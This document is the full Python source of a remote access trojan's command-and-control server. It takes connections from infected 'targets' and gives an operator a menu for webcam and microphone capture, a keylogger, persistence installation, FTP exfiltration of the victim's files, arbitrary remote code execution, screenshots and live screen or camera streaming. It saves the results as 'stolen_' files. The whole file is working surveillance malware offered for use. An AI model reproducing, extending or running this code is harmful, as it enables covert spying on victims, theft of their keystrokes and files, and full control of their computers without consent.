from socket import *
import os
import threading
import time
import queue

# ---------------- Globals ----------------
TARGETS       = {}
TARGET_ORDER  = []
REG_LOCK      = threading.Lock()
NEXT_ID       = [1]
STREAM_ACTIVE = {}

# ---------------- Helpers ----------------
def recv_exact(s, n):
    data = b''
    while len(data) < n:
        try:
            chunk = s.recv(n - len(data))
        except socket.timeout:
            continue
        except Exception:
            break
        if not chunk:
            break
        data += chunk
    return data

def recv_file(s, outpath):
    size = int(s.recv(16).decode().strip() or 0)
    data = recv_exact(s, size)
    with open(outpath, 'wb') as f:
        f.write(data)
    print(f'    [+] saved {len(data)} bytes -> {outpath}')

def recv_blob(s, tag_expected):
    tag = s.recv(len(tag_expected))
    if tag != tag_expected:
        return None
    size = int(s.recv(16).decode().strip() or 0)
    return recv_exact(s, size)

def send_line(s, text):
    s.sendall((text + '\n').encode())

def safe_unique(path):
    if not os.path.exists(path):
        return path
    base, ext = os.path.splitext(path)
    i = 1
    while os.path.exists(f'{base}_{i}{ext}'):
        i += 1
    return f'{base}_{i}{ext}'

def _recv_line_blocking(s, timeout=10.0):
    s.settimeout(timeout)
    buf = b''
    try:
        while not buf.endswith(b'\n'):
            c = s.recv(1)
            if not c:
                return ''
            buf += c
    except Exception:
        return ''
    finally:
        try:
            s.settimeout(None)
        except Exception:
            pass
    return buf.decode(errors='replace').strip()

def _recv_line(s):
    buf = b''
    while not buf.endswith(b'\n'):
        c = s.recv(1)
        if not c:
            return ''
        buf += c
    return buf.decode(errors='replace').strip()

def _rename_by_magic(path):
    try:
        with open(path, 'rb') as f:
            head = f.read(64)
    except Exception:
        return
    ext = '.bin'
    if head[:4] == b'RIFF' and b'AVI ' in head[:16]:
        ext = '.avi'
    elif head[4:8] == b'ftyp':
        ext = '.mp4'
    elif head[:3] == b'\x1aE\xdf':
        ext = '.mkv'
    if ext != '.bin':
        newpath = path.rsplit('.', 1)[0] + ext
        try:
            os.replace(path, newpath)
            print(f'    [i] detected {ext} -> {newpath}')
        except Exception:
            pass

# ---------------- Accept / register ----------------
def target_thread(sock, addr):
    try:
        sock.settimeout(5.0)
        hello = _recv_line(sock)
        sock.settimeout(None)
    except Exception:
        hello = ''
    hostname = hello[6:] if hello.startswith('HELLO:') else (addr[0] + ':' + str(addr[1]))

    with REG_LOCK:
        tid = NEXT_ID[0]
        NEXT_ID[0] += 1
        TARGETS[tid] = {'sock': sock, 'hostname': hostname,
                        'addr': addr, 'lock': threading.Lock()}
        TARGET_ORDER.append(tid)

    print(f'[+] Target #{tid} connected: {hostname} ({addr[0]})')

def accept_loop(S):
    while True:
        try:
            s, addr = S.accept()
        except Exception:
            break
        threading.Thread(target=target_thread, args=(s, addr), daemon=True).start()

def list_targets():
    with REG_LOCK:
        if not TARGETS:
            print('    (no targets)')
            return
        for tid in TARGET_ORDER:
            if tid in TARGETS:
                t = TARGETS[tid]
                print(f'    #{tid}  {t["hostname"]}  {t["addr"][0]}')

def parse_selection(text):
    text = text.strip().lower()
    with REG_LOCK:
        valid = [tid for tid in TARGET_ORDER if tid in TARGETS]
    if text in ('a', 'all', '*'):
        return valid
    out = []
    for part in text.replace(',', ' ').split():
        try:
            n = int(part)
        except ValueError:
            continue
        if n in valid:
            out.append(n)
    return out

# ---------------- Per-command handlers ----------------
def cmd_simple_ack(s):
    print('    ack:', s.recv(1024).decode(errors='ignore').strip())

def cmd_camera(s):
    tag = s.recv(1024).decode()
    if tag == 'CAM':
        recv_file(s, safe_unique('stolen_cam.jpg'))
    else:
        print('    no camera')

def cmd_video(s, dur):
    send_line(s, str(dur))
    tag = s.recv(1024).decode()
    if tag == 'VID':
        recv_file(s, safe_unique('stolen_vid.avi'))
    else:
        print('    no video')

def cmd_mic(s, dur):
    send_line(s, str(dur))
    tag = s.recv(1024).decode()
    if tag == 'MIC':
        recv_file(s, safe_unique('stolen_mic.wav'))

def _save_keylog(data):
    ts = time.strftime('%Y%m%d_%H%M%S')
    p = safe_unique(f'stolen_keylog_{ts}.txt')
    with open(p, 'wb') as f:
        f.write(data)
    with open('stolen_keylogs.txt', 'ab') as f:
        f.write(data)
    print(f'    [+] {len(data)} bytes -> {p}')

def _recv_keylog(s):
    tag = s.recv(1024).decode()
    if tag == 'LOG':
        size = int(s.recv(16).decode().strip() or 0)
        data = recv_exact(s, size)
        _save_keylog(data)

def cmd_keylogger(s):
    print('    1. timed auto-send')
    print('    2. F8 start / F8 stop')
    print('    3. continuous, F9/SEND push')
    mode = input('    Mode: ').strip()
    send_line(s, mode)
    if mode == '1':
        dur = input('    duration (s): ').strip() or '10'
        send_line(s, dur)
        _recv_keylog(s)
    elif mode == '2':
        print('    F8 on target to start/stop, type "wait" to poll, Enter to force-stop')
        while True:
            cmd = input('    Enter=stop, wait=poll: ').strip().lower()
            if cmd == 'wait':
                s.settimeout(1.0)
                try:
                    tag = s.recv(1024)
                    if tag:
                        size = int(s.recv(16).decode().strip() or 0)
                        data = recv_exact(s, size)
                        _save_keylog(data)
                        break
                except timeout:
                    continue
            else:
                send_line(s, 'STOP'); _recv_keylog(s); break
    elif mode == '3':
        while True:
            cmd = input('    SEND / RESET / STOP: ').strip().upper()
            if cmd == 'SEND':
                send_line(s, 'SEND'); _recv_keylog(s)
            elif cmd == 'RESET':
                send_line(s, 'RESET'); print('    cleared')
            elif cmd == 'STOP':
                send_line(s, 'STOP'); break

def cmd_persist_status(s):
    print('    status:', s.recv(1024).decode().strip())

def cmd_persist_install(s):
    print('    install:', s.recv(1024).decode().strip())

def cmd_av(s, dur):
    send_line(s, str(dur))
    tag = s.recv(1024).decode()
    if tag == 'AV':
        recv_file(s, safe_unique('stolen_av.mp4'))
    else:
        print('    no av')

def cmd_ftp(s):
    host = input('    FTP host: ').strip()
    port = input('    FTP port [21]: ').strip() or '21'
    user = input('    username: ').strip()
    pw   = input('    password: ').strip()
    path = input('    remote target file path (on trojan): ').strip()
    send_line(s, f'{host}|{port}|{user}|{pw}|{path}')
    print('    result:', s.recv(1024).decode().strip())

def cmd_rce(s):
    print('    Enter Python code. End with a single line containing __EOF__')
    lines = []
    while True:
        ln = input('    > ')
        if ln.strip() == '__EOF__':
            break
        lines.append(ln)
    code = '\n'.join(lines)
    send_line(s, str(len(code)))
    s.sendall(code.encode())
    out = recv_blob(s, b'RCE')
    print('    --- output ---')
    print((out or b'').decode(errors='replace'))
    print('    --- end ---')

def cmd_screenshot(s):
    tag = s.recv(1024).decode()
    if tag == 'SHOT':
        recv_file(s, safe_unique('stolen_screenshot.png'))
    else:
        print('    no screenshot')

def cmd_screenrec(s, dur):
    send_line(s, str(dur))
    tag = s.recv(1024).decode()
    if tag == 'SCRVID':
        p = safe_unique('stolen_screen.bin')
        recv_file(s, p)
        _rename_by_magic(p)
    else:
        print('    no screen recording')

def cmd_screenrec_av(s, dur):
    send_line(s, str(dur))
    tag = s.recv(1024).decode()
    if tag == 'SCRAV':
        p = safe_unique('stolen_screen_av.bin')
        recv_file(s, p)
        _rename_by_magic(p)
    else:
        print('    no screen a/v')

# ---------------- Streaming with live preview ----------------
def stream_receiver(tid, s, has_audio, out_base, stop_evt):
    import numpy as np
    import cv2
    import wave

    vpath = safe_unique(out_base + '.avi')
    apath = safe_unique(out_base + '.wav')
    vout = None
    aout = None
    got_video = False
    got_audio = False
    preview_created = False
    win_name = f'stream #{tid}'

    try:
        s.settimeout(5.0)
        while not stop_evt.is_set():
            try:
                hdr = recv_exact(s, 5)
            except socket.timeout:
                continue
            except Exception:
                break
            if len(hdr) < 5:
                break
            tag = hdr[:1]
            size = int.from_bytes(hdr[1:5], 'big')
            payload = recv_exact(s, size) if size else b''

            if tag == b'V':
                if size == 0:
                    break
                arr = np.frombuffer(payload, np.uint8)
                frame = cv2.imdecode(arr, cv2.IMREAD_COLOR)
                if frame is None:
                    continue
                got_video = True
                if vout is None:
                    h, w = frame.shape[:2]
                    vout = cv2.VideoWriter(
                        vpath, cv2.VideoWriter_fourcc(*'MJPG'),
                        15, (w, h))
                vout.write(frame)

                # --- live preview ---
                try:
                    if not preview_created:
                        cv2.namedWindow(win_name, cv2.WINDOW_NORMAL)
                        cv2.resizeWindow(win_name, 960, 540)
                        preview_created = True
                    cv2.imshow(win_name, frame)
                    if cv2.waitKey(1) & 0xFF == ord('q'):
                        stop_evt.set()
                        break
                except Exception:
                    pass
            elif tag == b'A':
                if not payload:
                    continue
                got_audio = True
                if aout is None:
                    aout = wave.open(apath, 'wb')
                    aout.setnchannels(1)
                    aout.setsampwidth(2)
                    aout.setframerate(44100)
                aout.writeframes(payload)
    except Exception as e:
        if 'timed out' not in str(e).lower():
            print(f'    [!] stream #{tid} error: {e}')
    finally:
        try:
            if vout: vout.release()
        except Exception: pass
        try:
            if aout: aout.close()
        except Exception: pass
        try:
            s.settimeout(None)
        except Exception: pass
        try:
            if preview_created:
                cv2.destroyWindow(win_name)
        except Exception: pass
        try:
            cv2.destroyAllWindows()
            cv2.waitKey(1)
        except Exception: pass

        saved = []
        if got_video:
            saved.append(vpath)
        if has_audio and got_audio:
            saved.append(apath)
        if saved:
            print(f'    [stream #{tid}] saved: {", ".join(saved)}')
        else:
            print(f'    [stream #{tid}] no data received')

def cmd_stream(s, tid, has_audio, use_camera):
    line = _recv_line_blocking(s, timeout=10.0)
    if line != 'STREAM_START':
        print(f'    [!] bad stream handshake: {line!r}')
        return

    base = f'stolen_stream_{"cam" if use_camera else "scr"}_{tid}'
    print('    [i] Streaming. A preview window will open.')
    print('    [i] Press "q" in the preview window OR press Enter here to stop.')

    stop_evt = threading.Event()
    rt = threading.Thread(
        target=stream_receiver,
        args=(tid, s, has_audio, base, stop_evt),
        daemon=True,
    )
    rt.start()

    try:
        input('    (Enter to stop stream) ')
    except Exception:
        pass
    stop_evt.set()
    try:
        s.sendall(b'STOP\n')
    except Exception:
        pass

    rt.join(timeout=10)

    try:
        s.settimeout(1.0)
        while True:
            try:
                junk = s.recv(1024)
            except Exception:
                break
            if not junk or b'STREAM_END' in junk:
                break
    except Exception:
        pass
    finally:
        try:
            s.settimeout(None)
        except Exception:
            pass

    print('    [stream] stopped')

# ---------------- Menu ----------------
MENU = (
    '\n===== MENU =====\n'
    'T. list targets\n'
    '1. shutdown           2. restart\n'
    '3. take a picture     4. record camera video\n'
    '5. record mic voice   6. keylogger\n'
    '7. check persistence  8. install persistence\n'
    '9. camera video + mic (recorded)\n'
    '10. FTP upload from target\n'
    '11. remote code execution\n'
    '12. screenshot\n'
    '13. screen recording\n'
    '14. screen recording + mic\n'
    '15. stream camera video (1080p) + LIVE PREVIEW\n'
    '16. stream camera video (1080p) + mic + LIVE PREVIEW\n'
    '17. stream screen video + LIVE PREVIEW\n'
    '18. stream screen video + mic + LIVE PREVIEW\n'
    'exit. quit\n'
    '================\n'
)

def main():
    S = socket()
    S.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
    S.bind(('0.0.0.0', 8888))
    S.listen()
    print('[C2] Listening on 0.0.0.0:8888')
    threading.Thread(target=accept_loop, args=(S,), daemon=True).start()

    while True:
        print(MENU)
        choice = input('Choice : ').strip()

        if choice.lower() == 'exit':
            print('[C2] exiting')
            return

        if choice.lower() == 't':
            list_targets(); continue

        if not choice:
            continue

        print('Select targets (e.g. "1", "1 3", "all")')
        sel = input('Targets : ')
        tids = parse_selection(sel)
        if not tids:
            print('    no matching targets')
            continue

        for tid in tids:
            t = TARGETS.get(tid)
            if not t:
                continue
            print(f'  -> target #{tid} ({t["hostname"]})')
            try:
                with t['lock']:
                    s = t['sock']
                    send_line(s, choice)

                    if choice in ('1', '2'):
                        cmd_simple_ack(s)
                    elif choice == '3':
                        cmd_camera(s)
                    elif choice == '4':
                        dur = input('    video duration: ').strip() or '5'
                        cmd_video(s, dur)
                    elif choice == '5':
                        dur = input('    voice duration: ').strip() or '5'
                        cmd_mic(s, dur)
                    elif choice == '6':
                        cmd_keylogger(s)
                    elif choice == '7':
                        cmd_persist_status(s)
                    elif choice == '8':
                        cmd_persist_install(s)
                    elif choice == '9':
                        dur = input('    a/v duration: ').strip() or '10'
                        cmd_av(s, dur)
                    elif choice == '10':
                        cmd_ftp(s)
                    elif choice == '11':
                        cmd_rce(s)
                    elif choice == '12':
                        cmd_screenshot(s)
                    elif choice == '13':
                        dur = input('    screen rec duration: ').strip() or '5'
                        cmd_screenrec(s, dur)
                    elif choice == '14':
                        dur = input('    screen a/v duration: ').strip() or '5'
                        cmd_screenrec_av(s, dur)
                    elif choice == '15':
                        cmd_stream(s, tid, has_audio=False, use_camera=True)
                    elif choice == '16':
                        cmd_stream(s, tid, has_audio=True, use_camera=True)
                    elif choice == '17':
                        cmd_stream(s, tid, has_audio=False, use_camera=False)
                    elif choice == '18':
                        cmd_stream(s, tid, has_audio=True, use_camera=False)
                    else:
                        print('    unknown choice')
            except Exception as e:
                print(f'    [!] #{tid}: {e}')

if __name__ == '__main__':
    main()